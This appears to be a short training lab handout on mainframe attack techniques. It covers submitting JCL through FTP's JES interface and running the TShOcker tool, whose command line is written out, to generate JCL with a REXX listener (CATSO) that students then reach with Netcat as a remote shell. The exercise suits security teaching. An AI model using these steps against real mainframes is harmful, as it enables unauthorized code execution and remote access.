1) Use FTP to execute JCL

	- Connect to the mainframe with FTP
	- Issue the FTP command: SITE FILE=JES
	- Upload your JCL
	- Record the JOBnnnnn where nnnnn is a number
	- List to see if the job ran
	- Download the job results (GET JOBnnnnn.X)

	Use this code and download the results. You have to put in your own job card. 
	You can copy/paste that from a previous lab (i.e. LAB01). Make sure the jobcard is your
	userid followed by a letter. Just one letter. 

	//<<JOBCARD>>
	//SEARCH  EXEC PGM=ISRSUPC,
	//            PARM='SRCHCMP,ANYC'
	//NEWDD  DD DISP=SHR,DSN=EVIL.JCL
	//OUTDD  DD SYSOUT=*
	//SYSIN  DD *
	SRCHFOR  'You'
	/*



2) Using JCL and REXX and FTP Execute some code. You can use TShocker to make the JCL for you. It include a rexx script called 'CATSO.rexx'. Or feel free to write your own REXX script.

	TShOcker:

	./TShOcker.py -p PORT -l --lport "<choose a port>" --print IP USERNAME PASSWORD > ./JCL_REXX

	--print means 'Print the JCL'
	PORT = Mainframe Port
	--lport is the listening port you want
	IP = Mainframe IP/Hostname
	USERNAME/PASSWORD = Username and Password

        Note: This script generates ASCII color codes, you'll need to edit JCL_REXX to remove those first
              before uploading

	Then connect with Netcat on the port you selected for --lport
